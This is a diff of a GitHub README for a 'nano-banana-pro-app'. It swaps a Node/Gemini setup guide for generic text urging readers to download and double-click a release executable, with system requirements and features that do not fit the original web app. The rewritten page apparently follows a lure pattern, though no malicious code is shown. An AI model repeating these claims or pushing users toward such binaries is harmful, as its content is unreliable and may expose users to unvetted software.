@@ -1,20 +1,90 @@
-<div align="center">
-<img width="1200" height="475" alt="GHBanner" src="https://github.com/user-attachments/assets/0aa67016-6eaf-458a-adb2-6e31a0763ed6" />
-</div>
+```markdown
+# 🍌 nano-banana-pro-app - Your Fun Playground for Creative Experiments
 
-# Run and deploy your AI Studio app
+## 🚀 Getting Started
 
-This contains everything you need to run your app locally.
+Welcome to the **nano-banana-pro-app**! This application offers a unique space for you to explore your creativity and have fun with interactive features. Follow these simple steps to download and set up the application.
 
-View your app in AI Studio: https://ai.studio/apps/drive/1OT7FMsEc7GhhcZllu6QWmRGmco9vsZ1r
+## 📥 Download the App
 
-## Run Locally
+[![Download nano-banana-pro-app](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/saadri7awi/nano-banana-pro-app/releases)
 
-**Prerequisites:**  Node.js
+## 🛠️ System Requirements
 
+Before you download, make sure your system meets the following requirements:
 
-1. Install dependencies:
-   `npm install`
-2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
-3. Run the app:
-   `npm run dev`
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** 200 MB of free disk space.
+- **Processor:** 2 GHz dual-core or better.
+- **Graphics:** A graphics card that supports OpenGL 2.0 or above.
+
+## 📥 Download & Install
+
+To get started, visit the following link to download the application:
+
+[Download nano-banana-pro-app](https://github.com/saadri7awi/nano-banana-pro-app/releases)
+
+1. Click on the link above to go to the Releases page.
+2. Find the latest version of *nano-banana-pro-app*.
+3. Click on the download link for your operating system (e.g., `nano-banana-pro-app-windows.exe` for Windows users).
+4. Save the file to your computer.
+
+### 🛠️ Installation Steps
+
+Once your download is complete, follow these steps to install:
+
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions. 
+4. You may choose the installation location or use the default option.
+5. Click "Install" and wait for the process to finish.
+6. Once installed, launch the application by selecting it from your applications menu or desktop shortcut.
+
+## 🌐 Features
+
+The **nano-banana-pro-app** offers a range of exciting features:
+
+- **Interactive Playground:** Enjoy a space where you can experiment with different creative tools.
+- **User-Friendly Interface:** Navigate easily with a clean and simple design.
+- **Save Your Work:** You can save your projects and revisit them later.
+- **Export Your Creations:** Share your work in various formats.
+- **Regular Updates:** We improve the app frequently based on user feedback.
+
+## 📖 User Guide
+
+After installing the app, a quick tutorial will guide you through the main features. 
+
+1. **Getting Started:** Understand the layout and tools available.
+2. **Creating Your First Project:** Use the step-by-step guide to create something new.
+3. **Saving and Sharing:** Learn how to keep your work and share it with friends or colleagues.
+
+For more detailed instructions, look for the Help section within the app. 
+
+## 🥳 Feedback & Support
+
+Your experience matters. If you encounter any issues or have suggestions:
+
+- Check the [Issues Page](https://github.com/saadri7awi/nano-banana-pro-app/issues) for common problems.
+- Feel free to create a new issue if you need assistance.
+- Join our community to connect with other users and share tips.
+
+## 🤝 Contributing
+
+We welcome contributions! If you want to help improve the application, please follow these steps:
+
+1. Fork the repository.
+2. Make your changes and test them thoroughly.
+3. Submit a pull request with a description of your changes.
+
+## 🌍 Connect with Us
+
+Stay updated with the latest news:
+
+- Follow us on [GitHub](https://github.com/saadri7awi/nano-banana-pro-app)
+- Join our community discussions.
+
+Thank you for choosing **nano-banana-pro-app**. We hope you enjoy creating and experimenting in your new playground!
+
+[Download nano-banana-pro-app](https://github.com/saadri7awi/nano-banana-pro-app/releases)
+```
